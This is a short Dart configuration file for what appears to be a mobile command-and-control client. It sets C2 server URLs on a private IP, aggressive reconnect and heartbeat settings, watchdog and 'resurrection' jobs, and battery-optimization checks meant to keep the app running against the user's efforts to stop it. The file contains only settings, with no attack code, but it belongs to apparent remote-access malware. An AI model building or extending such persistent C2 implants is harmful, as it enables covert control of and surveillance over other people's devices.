// lib/config/app_config.dart

// ✅ UPDATED: Configuration for your Python Flask-SocketIO server
const String C2_HTTP_SERVER_URL = 'http://192.168.8.200:5000';  // Your Python server
const String C2_SOCKET_IO_URL = 'ws://192.168.8.200:5000';      // Your Python server WebSocket

// Connection and retry settings
const Duration C2_SOCKET_IO_RECONNECT_DELAY = Duration(seconds: 5);
const int C2_SOCKET_IO_RECONNECT_ATTEMPTS = 50;  // Increased for better persistence

const Duration C2_HEARTBEAT_INTERVAL = Duration(seconds: 45);  // Interval for client to send heartbeat

// Background service settings
const Duration BACKGROUND_SERVICE_RESTART_DELAY = Duration(seconds: 10);
const Duration BACKGROUND_SERVICE_HEALTH_CHECK_INTERVAL = Duration(seconds: 30);

// Persistence settings
const Duration WATCHDOG_CHECK_INTERVAL = Duration(seconds: 30);
const Duration RESURRECTION_JOB_INTERVAL = Duration(minutes: 15);
const Duration KEEP_ALIVE_WORK_INTERVAL = Duration(minutes: 15);

// Battery optimization settings
const Duration BATTERY_OPTIMIZATION_CHECK_INTERVAL = Duration(hours: 24);

// Debug settings
const bool ENABLE_VERBOSE_LOGGING = true;
const bool ENABLE_PERSISTENCE_DEBUGGING = true;